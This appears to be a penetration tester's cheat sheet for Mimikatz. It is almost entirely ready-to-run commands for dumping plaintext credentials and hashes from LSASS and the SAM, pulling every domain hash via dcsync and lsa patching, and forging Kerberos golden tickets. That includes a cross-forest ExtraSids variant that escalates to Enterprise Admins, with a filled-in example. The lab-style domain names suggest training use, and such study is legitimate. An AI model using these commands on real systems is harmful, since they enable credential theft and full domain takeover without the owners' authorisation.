# Mimikatz

Use Mimikatz to dump local and domain plaintext credentials and hashes.

---

## Ensure you have administrative privileges

On a **Mimikatz prompt**:

```powershell
mimikatz: privilege::debug
```

On **Meterpreter**:

```bash
meterpreter > use kiwi
meterpreter > kiwi_cmd privilege::debug
```

If the output is **Privilege '20' OK**, you're good to move forward.

---

## Mimikatz One-Liner to Dump Local Hashes & Secrets

```powershell
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

---

## Dump Domain Hashes (dcsync method)

On a **Mimikatz prompt**:

```powershell
mimikatz: lsadump::dcsync /domain:$DOMAIN_NAME /all # HYDRA.test
```

```powershell
mimikatz: lsadump::dcsync /domain:marvel.test /all # HYDRA.test
```

On **Meterpreter**:

```bash
meterpreter > use kiwi
meterpreter > dcsync_ntlm $DOMAIN_USER # HYDRA\\grant.ward
```

---

## Dump Domain Hashes (lsa method)

On a **Mimikatz prompt**:

```powershell
mimikatz: lsadump::lsa /patch
```

---

## Create and Use a golden ticket

```powershell
mimikatz: kerberos::golden /user:$TARGET_USER_NAME /domain:$DOMAIN_NAME /sid:$DOMAIN_SID /krbtgt:$KRBTGT_NTLM /id:$TARGET_USER_ID /ptt
```

![Creating a golden ticket using Mimikatz](golden-ticket-kerberos-golden.png)

Open up a new command prompt that leverages the golden ticket (must be in a GUI session to access the new command prompt).

```powershell
mimikatz: misc::cmd
```

---

## Trustpocalypse - Create and Use a Golden Ticket with `ExtraSids` Set to the SID of `Enterprise Admins` of the Forest Root Domain

You'll need the [[golden-ticket#Required pieces of information|same items as normal for creating a golden ticket]]. In addition, you'll also need the SID of the `Enterprise Admins` group of the forest root domain.

```powershell
mimikatz: kerberos::golden /user:$USER_TO_IMPERSONATE /domain:$CHILD_DOMAIN_NAME /sid:$CHILD_DOMAIN_SID /krbtgt:$CHILD_DOMAIN_KRBTGT_NTLM /sids:$SID_OF_FOREST_ROOT_DOMAIN_ENTERPRISE_ADMINS_GROUP /id:$ID_OF_USER_TO_IMPERSONATE /ptt
```

- `$USER_TO_IMPERSONATE`: you probably want this to just be `Administrator`
- `$ID_OF_USER_TO_IMPERSONATE`: you probably want this just to be `500` (the ID of the domain administrator)

Example:

```powershell
kerberos::golden /user:Administrator /domain:dev.ADMIN.TGIHF.COM /sid:S-1-5-21-1416445593-394318334-2645530166 /krbtgt:9404def404bc198fd9830a3483869e78 /sids:S-1-5-21-1216317506-3509444512-4230741538-519 /id:500 /ptt
```

Test with `dir \\dc02.dev.ADMIN.TGIHF.COM\C$` or `dir \\dc03.ADMIN.TGIHF.COM\C$`.
